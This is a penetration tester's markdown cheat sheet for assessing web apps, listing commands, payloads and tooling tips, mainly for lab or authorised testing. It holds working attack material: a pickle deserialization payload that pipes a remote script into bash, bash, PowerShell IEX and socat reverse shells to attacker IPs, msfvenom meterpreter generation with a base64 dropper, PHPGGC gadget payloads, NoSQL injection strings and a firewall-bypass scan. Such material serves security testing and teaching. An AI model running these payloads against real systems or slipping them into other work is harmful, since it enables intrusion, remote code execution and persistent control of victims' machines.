# Technical hints

> Use this [tool](https://ecotrust-canada.github.io/markdown-toc/) to build the TOC.

* [Personal methodology to assess an web app in whitebox mode](#Personal-methodology-to-assess-a-web-app-in-whitebox-mode)
* [Useful command lines](#useful-command-lines)
* [Deserialization issue exploitation](#deserialization-issue-exploitation)
* [Listen on local port and forward incoming traffic to remove host via SSH](#listen-on-local-port-and-forward-incoming-traffic-to-remote-host-via-ssh)
* [Connect to listener for a reverse shell](#connect-to-listener-for-a-reverse-shell)
* [Setup a local listener for a reverse shell](#setup-a-local-listener-for-a-reverse-shell)
* [See OS version and architecture](#see-os-version-and-architecture)
* [Nmap ping sweep](#nmap-ping-sweep)
* [Nmap scan specifying a source port to bypass lazy firewall filtering](#nmap-scan-specifying-a-source-port-to-bypass-lazy-firewall-filtering)
* [Nmap on IPv6 target](#nmap-on-ipv6-target)
* [SCP using IPv6](#scp-using-ipv6)
* [SSH using IPv6](#ssh-using-ipv6)
* [Get IPv6 addresses of hosts around](#get-ipv6-addresses-of-hosts-around)
* [List known hosts IPV6 addresses](#list-known-hosts-ipv6-addresses)
* [List known hosts IPV4 addresses and hosts](#list-known-hosts-ipv4-addresses-and-hosts)
* [Forward TCP traffic from SOURCE to DESTINATION using SOCAT and sent it as background task](#forward-tcp-traffic-from-source-to-destination-using-socat-and-sent-it-as-background-task)
* [Possible ways to perform a LPE on Linux](#possible-ways-to-perform-a-lpe-on-linux)
* [Upgrading shells to fully interactive TTYs](#upgrading-shells-to-fully-interactive-ttys)
* [File temporary storage location](#file-temporary-storage-location)
* [Start local HTTP server to transfer payload to the victim host](#start-local-http-server-to-transfer-payload-to-the-victim-host)
* [Start local SMTP server to allow to receive mail](#start-local-smtp-server-to-allow-to-receive-mail)
* [Listen for ICMP messages in order to test connection from a remote host](#listen-for-icmp-messages-in-order-to-test-connection-from-a-remote-host)
* [Leverage WFUZZ for user enumeration](#leverage-wfuzz-for-user-enumeration)
* [Verify if INPUT or OUTPUT traffic is filtered](#verify-if-input-or-output-traffic-is-filtered)
* [Verify NGINX configuration statically](#verify-nginx-configuration-statically)
* [Share files between a Linux and a Windows machine](#share-files-between-a-linux-and-a-windows-machine)
* [Get information to use for system PrivEsc](#get-information-to-use-for-system-privesc)
* [NoSQL injection hints](#nosql-injection-hints)
* [SQL injection hints](#sql-injection-hints)
* [Debug a DotNet web app with DNSpy](#debug-a-dotnet-web-app-with-dnspy)
* [Debug a Python web app with VSCode](#debug-a-python-web-app-with-vscode)
* [Debug a NodeJS web app with VSCode](#debug-a-nodejs-web-app-with-vscode)
* [Debug a PHP web app with VSCode](#debug-a-php-web-app-with-vscode)
* [Method Resolution Order (MRO) in Python](#method-resolution-order-in-python)
* [Open RDP session via XFREERDP](#open-rdp-session-via-xfreerdp)
* [Python coding tips](#python-coding-tips)
* [Identify JavaScript libs deployed alongside a web application but not referenced](#identify-javascript-libs-deployed-alongside-a-web-application-but-not-referenced)
* [Disable TLS warnings in the requests python module](#disable-tls-warnings-in-the-requests-python-module)
* [JavaScript Fetch API tips](#javascript-fetch-api-tips)
* [Meterpreter shell tips](#meterpreter-shell-tips)
* [SSTI tips](#ssti-tips)
* [XML entities types and XXE payloads](#xml-entities-types-and-xxe-payloads)
* [PHP Type Juggling](#php-type-juggling)

## Personal methodology to assess a web app in whitebox mode

**Flow:**

```text
ANONYMOUS > AUTHENTICATED LOW PRIV > AUTHENTICATED HIGH PRIV > SYSTEM READ/WRITE > SHELL
```

**Step 1:**

Identify in code all features accessible anonymously and confirm access via an HTTP call.

**Step 2:**

Search into element identified in step 1 for vulnerability allowing to pass in a authenticated state (normal or privilegied):

* In case of SQLI: Verify if stack queries are supported, if NOT verify the presence of a reset password feature or any feature allowing to retrieve/obtain some kind of access token...
* In case of serialization: Verify if control is performed on the data received (signature, HMAC...)...
* Take care to logic applied in order to identify any issue in it (ex: custom algo or predictable generated element like reset token...).
* ...

**Step 3:**

Search for a way (doc, install file, hard coded, enumeration...) to obtain a user or a list of user in order to leverage the step 2.

**Step 4:**

Use element gathered in steps 1+2+3 to obtain an authenticated session.

**Needed if required for the next step:** If the access was not privilegied then repeat step 2+3 targeting feature accessible to the authenticated user in order to pass in privilegied mode.

**Step 5:**

Use element gathered in step 4 to look for a way to interact with the OS filesystem directly (ex: XXE) or via a relay like the DB (ex: custom extension).

**Step 6:**

Use element gathered in step 5 to look for vulnerability to gain RCE and then a reverse shell.

## Useful command lines

### Linux

```shell
# List files recursively in folder "/tmp" and print them as table
$ find /tmp -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
pid                /tmp/pulse-PKdhtXMmr18n/pid  lab  lab  600
config-err-8ebCtm  /tmp/config-err-8ebCtm       lab  lab  600
.X10-lock          /tmp/.X10-lock               lab  lab  444

# Inspect what a binary does? http://man7.org/linux/man-pages/man1/ltrace.1.html
$ ltrace ./mybinary
setuid(0)
setgid(0)
printf("start or stop?: ")
...
```

### Windows Powershell

```powershell
# Watch the event of the Windows Firewall (need to be run as admin)
PS> Get-Content C:\Windows\System32\LogFiles\Firewall\pfirewall.log -Wait

# List local users
PS> Get-LocalUser

# List only enabled local users
PS> Get-LocalUser | Where { $_.Enabled -eq 'True' }

# Get infos about a local user
PS> net user righetto
PS> Get-LocalUser -Name "righetto"

# List users that are local administrator
PS> Get-LocalGroupMember -Group "Administrators"

# Try to list configuration files of installed applications
PS> Get-Childitem -Path "C:\Program Files" -Include *.xml,*.conf,*.config,*.ini,*.properties -Recurse -Force

# List environment variables
PS> Get-ChildItem Env:

# Identify all instances of a executable
PS> tasklist | findstr /i calc

# Kill all instances of a executable
PS> tasklist /f /IM calc.exe
```

### PostgreSQL

#### List functions

Inside a PSQL session:

```sql
# Check if a function named 'my_function' exists
\df my_function
# List all functions
\df
```

#### PSQL

Connect via [PSQL](http://postgresguide.com/utilities/psql.html):

```shell
$ psql "dbname=[DB] host=[HOST] user=[USER] password=[PASSWORD] port=[PORT]"
```

#### Enable logging of queries

In the `[PG_HOME]/data/postgresql.conf` file, change the following parameters ([source](https://stackoverflow.com/a/722236/451455)):

* **log_statement** to **all**.
* **logging_collector** to **on**.
* Make sure that the **log_directory** directory already exists inside of the data directory and that the postgres user can write to it.

### MySQL / MariaDB

#### Enable logging of queries

In the `[MYSQL_HOME]/my.cnf` file, change the following parameters ([source](https://stackoverflow.com/a/6479183/451455)):

* **general_log_file** to a file location where the mysql user can write to it (you can leave the default one).
* **general_log** to **1**.

### Command encoding for Windows Powershell

Use the following instruction to encode a command that will be passed to powershell using the syntax `powershell -EncodedCommand [CMD]`:

```shell
$ iconv -f ASCII -t UTF-16LE powershell-cmd-raw.txt | base64 | tr -d "\n" > powershell-encoded.txt
```

## Deserialization issue exploitation

### Identity serialization processing in code base

Search for the following strings.

#### Java

```
ObjectInputStream
readObject
```

#### .NET

```
ISerializable
Deserialize
Serialize
```

#### PHP

```
serialize
unserialize
```

#### Python

```
pickle
dumps
loads
```

### When YSOSERIAL for .NET is used

#### Different modes used

[Documentation](https://docs.microsoft.com/en-us/dotnet/standard/serialization) about the different modes used: JSON / Binary / XML.

#### Format of the .NET assembly-qualified name

[Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.type.assemblyqualifiedname)

Example: `System.Globalization.NumberFormatInfo, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089`

Parts separated by a comma:

1. Namespace (`System.Globalization`) + `.` + Classname (`NumberFormatInfo`)
2. Display name of the assembly obtained using the `Assembly.FullName` property
3. Version of the assembly
4. Culture of the assembly
5. Optional PublicKeyToken (can be set to null)

### When YSOSERIAL is used

> This [script](../scripts/identify-potential-payloads.sh) can be used to perform a static analysis of the different libraries (JAR files) used by an application in order to identify potentials applicable YSOSERIAL payloads.

PowerShell break the binary content when sending it to a file using the `>` instruction like this:

```powershell
PS> java -jar ysoserial.jar Groovy1 calc.exe > payload.bin
```  

Use a normal shell (MSDOS) to generate the payload binary file and ensure that the HEX content start with **aced** or the Base64 content start with **rO0**.

Use the following Linux command to encode the binary payload in Base64:

```shell
$ cat payload.bin | base64 -w 0 > payload-encoded.txt
```

### When PHPGGC is used

Always use the option:

- `-s` to prevent any issue with non-printable characters.
- `-f` when the magic method used by the kick-off gadget (called vector in PHPGGC) is *__destruct*.

Example:

```shell
$ php phpggc -f "Symfony/RCE4" "system" "id"
a:2:{i:7;O:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;O:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"*poolHash";i:1;s:12:"*innerItem";s:2:"id";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";i:1;s:58:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:6:"system";}}i:7;i:7;}

$ php phpggc -s -f "Symfony/RCE4" "system" "id"
a:2:{i:7%3BO:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00deferred"%3Ba:1:{i:0%3BO:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"%00*%00poolHash"%3Bi:1%3Bs:12:"%00*%00innerItem"%3Bs:2:"id"%3B}}s:53:"%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00pool"%3BO:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"%00Symfony\Component\Cache\Adapter\ProxyAdapter%00poolHash"%3Bi:1%3Bs:58:"%00Symfony\Component\Cache\Adapter\ProxyAdapter%00setInnerItem"%3Bs:6:"system"%3B}}i:7%3Bi:7%3B}
```

### When Python is used

If the decoded element start by `\x80\x03` or `\x80\x04` then try to load it via [Pickle](https://docs.python.org/3/library/pickle.html) because it seems to be a serialized object:

```text
# Test on Linux
Python 3.8.2 - [GCC 9.3.0] on linux
>>> import pickle
>>> print(pickle.dumps("TEST"))
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04TEST\x94.'
>>> print(pickle.dumps([1,2,3]))
b'\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.'
>>> print(pickle.dumps({"A":123}))
b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x01A\x94K{s.'

# Test on Windows
Python 3.7.8 - [MSC v.1916 64 bit (AMD64)] on win32
>>> import pickle
>>> print(pickle.dumps("TEST"))
b'\x80\x03X\x04\x00\x00\x00TESTq\x00.'
>>> print(pickle.dumps([1,2,3]))
b'\x80\x03]q\x00(K\x01K\x02K\x03e.'
>>> print(pickle.dumps({"A":123}))
b'\x80\x03}q\x00X\x01\x00\x00\x00Aq\x01K{s.'
```

Code to deserialize a Base64 encoded content using Pickle:

```python
import pickle, base64
encoded = "gAN9cQBYBQAAAG....."
decoded = base64.b64decode(encoded)
object = pickle.loads(decoded)
print(object)
```

Payload example in order obtain a code execution during the deserialize phase:

```python
#!/usr/bin/python3
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('/usr/bin/curl 10.10.10.10/rs.sh | /bin/bash')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    encoded = base64.b64encode(pickled)
    print(encoded) # String to use
```

## Listen on local port and forward incoming traffic to remote host via SSH

[Source](https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling).

Scenario: access a host that's being blocked by a firewall via SSH_SERVER

```shell
ssh -L 127.0.0.1:LOCAL_PORT:REMOTE_HOST:REMOTE_PORT user@SSH_SERVER
```

## Connect to listener for a reverse shell

### Linux

```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
```

### Windows Powershell

:information_source: For this case a web listener is needed in addition of the netcat listener.

:information_source: In the command below the web listener listen on `10.10.10.10:9200` and the netcat listener listen on `10.10.10.10:9001`

The PS command that is executed is based on [IEX (Invoke-Expression)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7): 

> The **Invoke-Expression** (IEX) cmdlet evaluates or runs **a specified string** as a command and returns the results of the expression or command.

*System.Net.WebClient* class [documentation](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=netcore-3.1)

> Downloads the requested resource as a String. The resource to download may be specified as either String containing the URI or a Uri.

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:9200/rs.ps1')
```

For the script executed (invoked as an string expression), the script [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) is used but with the **adding of this line at the end of the script to auto-execute the function** defined by the script:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 9001
```

## Setup a local listener for a reverse shell

```shell
nc -lnvp 9001
```

## See OS version and architecture

### Linux

```shell
lsb_release -a
hostnamectl
cat /etc/os-release
```

See the script [os-info.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/os-info.sh).

### Windows Powershell

```powershell
PS> Systeminfo 
Host Name:                 MACHINETEST
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
...
```

## Nmap ping sweep

```shell
nmap -sP 172.31.1-255.1-255
```

See the script [ping-sweep.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/ping-sweep.sh) if it is not possible to upload a static version of nmap.

Same thing regarding the script [ports-scan.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/ports-scan.sh).

## Nmap scan specifying a source port to bypass lazy firewall filtering

Here using DNS ports because it is often allowed (no DNS resolution) and assuming that the host is alive

```shell
nmap -sS -p1-1024 -Pn -n -v --source-port 53 192.168.5.2
```

## Nmap on IPv6 target

IP is specified using `[IP]%[NETWORK_CARD_IDENTIFIER]`

```shell
nmap -6 -p 2222 --open fe80::5054:ff:fec6:7066%ens3
```

## SCP using IPv6

IP is specified between `[]`

```shell
scp -P 987 user@[fe80::5054:ff:fec6:7066%ens3]:/home/file.txt .
```

## SSH using IPv6

```shell
ssh -p2222 user@fe80::5054:ff:fec6:7066%ens3
```

## Get IPv6 addresses of hosts around

Ping the multicast IPV6 address (ff02::1) to get the IPV6 address of neighbours:

* [Source 1](https://en.wikipedia.org/wiki/Multicast_address#IPv6)
* [Source 2](https://www.menandmice.com/blog/ipv6-reference-multicast/)

*ens3* is the `[NETWORK_CARD_IDENTIFIER]`

```shell
ping6 -I ens3 ff02::1
```

 See the script [identify-neighbour-hosts.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/network-config.sh).

## List known hosts IPV6 addresses

```shell
ip -6 neigh
```

## List known hosts IPV4 addresses and hosts

In order to map corresponding IPV6 addresses based on MAC addresses and then identify hosts.

Use `arp -a` without param `-n` to see hostname.

```shell
arp -an
```

## Forward TCP traffic from SOURCE to DESTINATION using SOCAT and sent it as background task

Syntax:

```shell
socat TCP-LISTEN:SOURCE_PORT,bind=SOURCE_ADDRESS,fork,reuseaddr TCP:DESTINATION_ADDRESS:DESTINATION_PORT &
```

Example:

```shell
socat TCP-LISTEN:9002,bind=192.168.145.5,fork,reuseaddr TCP:localhost:9001 &
```

## Possible ways to perform a LPE on Linux

See [this video from IppSec](https://www.youtube.com/watch?v=LfbwlPxToBc&t=3339s).

### Way 1

Search for services listening on localhost and running as root then try to explore them...

```shell
netstat -anlp | grep LIST
```

### Way 2

Check if there is SPICE ports used.

Spice is an open remote computing solution, providing client access to remote displays and devices

The main use case is to get remote access to virtual machines.

Port example: 5800/5900 for VNC

```shell
ps -eaf | grep [PORT] #and check for SPICE port in the command line
```

Use tool like remove-viewer to access to the console (`apt install virt-viewer`)

```shell
remove-viewer spice://[TARGET_ADDRESS]:[SPICE_PORT]
```

Once on the login prompt:

1) Reboot the VM via `CTRL+ALT+DEL`.
2) Edit the GRUB to have a shell as root ([password recovery](https://linuxconfig.org/how-to-reset-kali-linux-root-password)).
3) Change the root password and then reboot the VM.

## Upgrading shells to fully interactive TTYs 

* [Source 1](https://www.ivoidwarranties.tech/posts/pentesting-tuts/upgrading-shells/).
* [Source 2](http://netsec.ws/?p=337).

### Method 0: Using script system binary

```shell
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
```

### Method 1: Using Python pty module

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Method 2: Using socat

On attacker Linux machine (listen):

```shell
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On victim Linux machine (connect):

```shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### Method 3: Using infodox python-pty-shells scripts

[Scripts repository](https://github.com/infodox/python-pty-shells).

**Require Python2 on the both side!**

Run the script `tcp_pty_shell_handler.py` on the attacker machine.

Run the script `tcp_pty_backconnect.py` on the victim machine to connect to the handler.

## File temporary storage location

### Linux

[Source](https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html).

On Linux, file like reverse shell can be stored in folder `/dev/shm` in order to not pollute the permanent storage and allow an auto-cleanup at reboot.

`/dev/shm` is nothing but implementation of traditional shared memory concept.

## Start local HTTP server to transfer payload to the victim host

Run the following command on the attacker host.

Python2:

```python
python -m SimpleHTTPServer
```

Python3:

```python
python -m http.server
```

## Listen for ICMP messages in order to test connection from a remote host

Useful to test a blind RCE.

Run the following command on the attacker machine:

```shell
# Linux
## Example: tcpdump -i eth0 icmp
sudo tcpdump -i [INTERFACE] icmp
# Windows: https://www.winpcap.org/windump/install/default.htm
## List the interface
windump.exe -D
## Listen
## Example: windump.exe -i "\Device\NPF_{ABC26408-X6CZ-4200-9276-34V8982C9983}" icmp
WinDump.exe -i "[INTERFACE]" icmp
```

Run the following command on the victim machine:

```shell
# Linux
ping -c 2 [ATTACKER_IP]
# Windows
ping -n 2 [ATTACKER_IP]
```

## Leverage WFUZZ for user enumeration

Example of a command to use in case of an application sending a HTTP response containing the message *Wrong identification* when the user exists:

```shell
# Use the dict "names.txt" from SecLists (folder "Usernames/Names")
# It is a POST request
# We only show responses with an HTTP 200 and containing the expected string
wfuzz -c -z file,names.txt --sc 200 --ss "(Wrong identification)" -d "username=FUZZ&password=badpwd" "http://10.0.3.4/login.php"

# Table of results rendered by WFUZZ during the operation
===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000086:   200        102 L    659 W    7091 Ch     "john"
000000111:   200        102 L    657 W    7074 Ch     "ariel"
```

Help about the error *[Unhandled exception: cannot add/remove handle - multi_perform() already running](https://github.com/xmendez/wfuzz/issues/180#issuecomment-577135888)*


## Verify if INPUT or OUTPUT traffic is filtered

### Linux

Check the following files for presence of *IPTABLES* rules:

```shell
# For IPV4
$ cat /etc/iptables/rules.v4
# For IPV6
$ cat /etc/iptables/rules.v6
```

### Windows Powershell

```powershell
# Get firewall profiles that are enabled
Get-NetFirewallProfile | Where { $_.Enabled -eq 'True' }
# List all inbound enabled rules
Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' }
# List all inbound enabled rules applying a block action
Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' -and $_.Action -eq 'Block' }
# List all outbound enabled rules
Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Outbound' }
# List all outbound enabled rules applying a block action
Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Outbound' -and $_.Action -eq 'Block' }
```

## Verify NGINX configuration statically

The tool [GIXY](https://github.com/yandex/gixy) can be used against the NGINX configuration file.

## Share files between a Linux and a Windows machine

:information_source: Here the attacker machine is the Linux (IP: 10.10.14.10) one and the victim is the Windows (IP: 10.10.10.158) one.

1. On the attacker machine (Linux), use the following command to create the SMB share:

```shell
$ sudo impacket-smbserver -username righettod -password righettod ShareSpace $(pwd)
Impacket v0.9.21 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

2. On the victim machine (Windows), use the following command to mount the SMB share:

```powershell
PS> $pass = "righettod" | ConvertTo-SecureString -AsPlainText -Force
PS> $pass
System.Security.SecureString

PS> $cred = New-Object System.Management.Automation.PsCredential('righettod', $pass)
PS> $cred
UserName                                                               Password
--------                                                               --------
righettod                                          System.Security.SecureString

PS> New-PSDrive -name ShareSpace -root \\10.10.14.10\ShareSpace -Credential $cred -PSProvider "filesystem"
Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
ShareSpace                             FileSystem    \\10.10.14.10\ShareSpace  

PS> cd ShareSpace:
```

:warning: I have meet the following error on Kali with *Impacket v0.9.20* and *Python 3.8.x*:

```shell
[*] Incoming connection (10.10.10.158,50124)
[*] AUTHENTICATE_MESSAGE (JSON\righettod,JSON)
[-] processRequest (0x73,Missing required parameter 'digestmod'.) <=== ERROR
[*] Handle: Missing required parameter 'digestmod'.
[*] Closing down connection (10.10.10.158,50124)
```

To fix it, I have upgraded **impacket** via the following command:

```shell
$ sudo pip3 install impacket --upgrade
```

## Get information to use for system PrivEsc

Use the following tools.

### Get infos

#### Linux

* [Linux Enumeration](https://github.com/rebootuser/LinEnum)
* [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

#### Windows Powershell

* [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

### Get applicable exploit

#### Linux

* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

#### Windows Powershell

* [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)

## NoSQL injection hints

### MongoDB

#### Case 1

If the application construct a query using the following syntax ([source](https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/)):

```php
$USR = $_GET['username'];
$PWD = $_GET['password'];
$query = "var data = db.users.findOne({username:'$USR', password:'$PWD'}); return data;"
$data = $collection->execute($query);
//...
```

Then I can try to detect my capability to influence the query by trying to use one of the following character `' " \ / // ; { } :` in one of the HTTP parameter in order to detect either an error or a change in the response.

#### Case 2

If the application construct a query using the following syntax ([source](https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/)):

*PHP*

```php
$USR = $_GET['username'];
$PWD = $_GET['password'];
$query = array("username" => $USR, "password" => $PWD);
$cursor = $collection->find($query);
//...
```

*NodeJS*

```javascript
let uname = req.body.username;
let pass = req.body.password;
let query = { 
	username: uname,
	password: pass 
}
User.find(query, function (err, user) {/* ... */});
```

Then I can try to detect my capability to influence the query by using [query and projection operators](https://docs.mongodb.com/manual/reference/operator/query/) expression on the HTTP parameter like this:

> It must be adapted to the target platform dealing with the MongoDB! 

*Example for PHP*

```php
// $eq: Matches values that are equal to a specified value.
// $ne: Matches all values that are not equal to a specified value.
// Here check if I can influence the query and check if a user "admin" exists with a password different from "test"
username[$eq]=admin&password[$ne]=test
// $regex: Selects documents where values match a specified regular expression.
// Here check if I can influence the query and check if there is a user with a username 
// starting with the letter "a" with a password different from "yololo"
// The following regex can be used to identify the item with the maximum length (here testing max length to 5): ^.{5}$
username[$regex]=^a.*&password[$ne]=yololo
```

*Same example but for NodeJS where JSON is sent in request body*

```javascript
{"username":{"$eq":"admin"},"password":{"$ne":"test"}}

{"username":{"$regex":"^a.*"},"password":{"$ne":"yololo"}}
```

## SQL injection hints

### Identity query building via string concatenation in code base

Search for the following patterns:

```shell
# Replace the "\+" by the string concatenation character for the target technology
$ grep -Ernwi --color "(SELECT|INSERT|UPDATE|DELETE|ORDER).*?\+.*?" *
```

### PostgreSQL

#### Hints

* Two dollar characters (`$$`) can be used as a quote (`'`).
* Single dollar (`$`) can indicate the beginning of a **tag**. The tag is optional, can contain zero or more characters, and is terminated with a matching dollar (`$`). A closing tag is required to finalize the string.

Example:

```sql
SELECT 'TEST';
SELECT $$TEST$$;
SELECT $TAG$TEST$TAG$;
```

#### System command execution via a SQLI

System command execution can be achieved via a [User Defined Function](https://www.postgresql.org/docs/current/xfunc.html) associated to a custom library (see this [code](../scripts/pg_cmdexec_extension.c) to compile for the target OS and version of PostgreSQL targeted).

For Windows, `system()` vs `ShellExecute()` usage for command execution:

* `system()` can be used on Windows too but it hang until the command executed is finished.
* `ShellExecute()` execute the command and continue without waiting that the command finish.

Follow these steps:

> Daily build of the extension for Linux 64 bits for several versions of PostgreSQL are provided [here](https://github.com/righettod/toolbox-pentest-web/actions?query=workflow%3A%22Build+PostgreSQL+extension%22).

1. Get the version of the DB and OS via the following query:

```sql
SELECT version();
```

2. For Windows install the headers files during the PG installation - For Linux install the following packages:

```shell
# For "postgresql-server-dev-10" install the version matching the version of PostgreSQL targeted
# based on information from the "SELECT version();" query
$ sudo apt install postgresql postgresql-server-dev-10 gcc
```

3. For Windows see [here](https://wiki.postgresql.org/wiki/Building_and_Installing_PostgreSQL_Extension_Modules#Windows_with_Microsoft_Visual_Studio) - For Linux use the following commands to compile the extension:

```shell
$ which pg_config
/usr/bin/pg_config
$ gcc -I$(/usr/bin/pg_config --includedir-server) -shared -fPIC -o pg_cmdexec_extension.so pg_cmdexec_extension.c
$ file pg_cmdexec_extension.so
pg_cmdexec_extension.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
```

4. Use this [script](../scripts/pg_cmdexec_via_lob.py) to load and use the library via an UDF in order to execute system commands via an SQLI (blind or not).

## Method Resolution Order in Python

Good explanation [here](http://www.srikanthtechnologies.com/blog/python/mro.aspx).

## Python coding tips

See [here](https://book.pythontips.com/en/latest/index.html).

## Open RDP session via XFREERDP

[Documentation](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface).

```shell
$ xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /v:[HOST] /u:[LOGIN] /p:[PASSWORD] /size:1180x708
```

## Identify JavaScript libs deployed alongside a web application but not referenced

> This [script](../scripts/identify-hidden-js-libs.sh) can be used to perform the discovery of elements mentioned below.

The following repository is useful to discover JS libraries deployed alongside an app but unused (.i.e unreferenced).

See [here](https://github.com/nice-registry/all-the-package-names).

## Start local SMTP server to allow to receive mail

Run the following command.

Python3:

```python
python -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

**Note:** *DebuggingServer* indicate to discard the message after the *smtpd* server receive it.

## Disable TLS warnings in the requests python module

Python3:

```python
import requests
# Disable TLS warning when validation is disabled when requests is used
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Configure proxy to debug request sent using requests and disable validation of the TLS certificate
proxies = { "http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080" }
response = requests.get("https://target.com", verify=False, proxies=proxies)
```

## JavaScript Fetch API tips

[Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API).

[Credentials clause documentation](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials).

### Upload a file

```javascript
//Embeed the file as a blob
var filename = "file.tar.gz";
var fileEncodedInB64 = "...";
//See "https://stackoverflow.com/a/16245768" for the B64 to binary blob handling
var byteCharacters = atob(fileEncodedInB64);
var byteNumbers = new Array(byteCharacters.length);
for (i = 0; i < byteCharacters.length; i++) {
    byteNumbers[i] = byteCharacters.charCodeAt(i);
}
var byteArray = new Uint8Array(byteNumbers);
var fileBlob = new Blob([byteArray], {type: "application/x-compressed-tar"});
//Upload the file
var formData  = new FormData();
formData.append("file", fileBlob, filename);
fetch("/upload ", { credentials: "include", "method": "POST", body: formData})
	.then(response => response.text())
	.then((body) => { /* Do something with the body text content */ });
```

### Post a form

```javascript
var formData  = new FormData();
formData.append("login", login);
formData.append("password", password);
fetch("/login", { credentials: "omit", "method": "POST", body: formData})
	//See https://developer.mozilla.org/en-US/docs/Web/API/Body/text
	//See https://developer.mozilla.org/en-US/docs/Web/API/Body/json
	.then(response => response.text()) 
	.then((body) => {  /* Do something with the body text content */ });
```

### Deal with HTTP 30x

```javascript
var formData = new FormData();
formData.append("login", login);
formData.append("password", password);
fetch("/login", { credentials: "include", "method": "POST", body: formData })
	.then(response => {
		//If "response.redirected" is true then a HTTP 30x was received
		//See https://developer.mozilla.org/en-US/docs/Web/API/Response/redirected
		if (response.redirected) { /* Do something */ }
	});
```

## Meterpreter shell tips

[MSFVenom cheatsheet documentation](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/).

[Meterpreter basics documentation](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).

### Generate a meterpreter client

#### Linux x86

```shell
$ msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp  LHOST=10.10.10.10 LPORT=2222 -f elf > shell.bin
$ file shell.bin
```

#### Windows x86

```shell
$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=2222 -f exe > shell.exe
$ file shell.exe
```

### Start listener server

Once in *MSFConsole*:

```shell
use exploit/multi/handler
set PAYLOAD [SAME_THAN_ONE_SPECIFIED_FOR_CLIENT] # Specified in parameter "-p"
set LHOST 10.10.10.10 # Network interface, like "eth0", can be specified instead of host/ip
set LPORT 2222
exploit
```

### Meterpreter client dropper

```bash
#!/bin/bash
# Meterpreter binary encoded in Base64
# via the command "cat meter.bin | base64 -w 0"
m="xxxx"
# Decode and execute it
echo $m | base64 -d > /tmp/meter.bin
chmod +x /tmp/meter.bin
/tmp/meter.bin
```

